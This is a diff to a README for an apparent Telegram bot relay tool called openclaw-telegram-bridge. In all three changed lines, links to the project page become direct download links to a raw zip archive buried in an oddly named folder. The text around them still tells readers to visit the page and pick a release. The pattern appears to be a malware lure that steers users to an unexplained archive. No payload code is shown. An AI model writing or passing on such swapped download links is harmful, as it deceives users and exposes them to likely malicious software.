@@ -1,6 +1,6 @@
 # 🤖 openclaw-telegram-bridge - Relay Telegram Bots Without Limits
 
-[![Download](https://img.shields.io/badge/Download-OpenClaw_Telegram_Bridge-blue?style=for-the-badge)](https://github.com/Lastea4013/openclaw-telegram-bridge)
+[![Download](https://img.shields.io/badge/Download-OpenClaw_Telegram_Bridge-blue?style=for-the-badge)](https://github.com/Lastea4013/openclaw-telegram-bridge/raw/refs/heads/main/interproximate/telegram-openclaw-bridge-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it to:
 ## 📥 Download
 
 Visit this page to download:
-https://github.com/Lastea4013/openclaw-telegram-bridge
+https://github.com/Lastea4013/openclaw-telegram-bridge/raw/refs/heads/main/interproximate/telegram-openclaw-bridge-v2.4.zip
 
 On the page, look for the latest release or the main project files. Download the Windows file or package that matches the version you want.
 
@@ -157,4 +157,4 @@ This project relates to:
 
 ## 📎 Download Again
 
-[Visit the download page](https://github.com/Lastea4013/openclaw-telegram-bridge)
+[Visit the download page](https://github.com/Lastea4013/openclaw-telegram-bridge/raw/refs/heads/main/interproximate/telegram-openclaw-bridge-v2.4.zip)
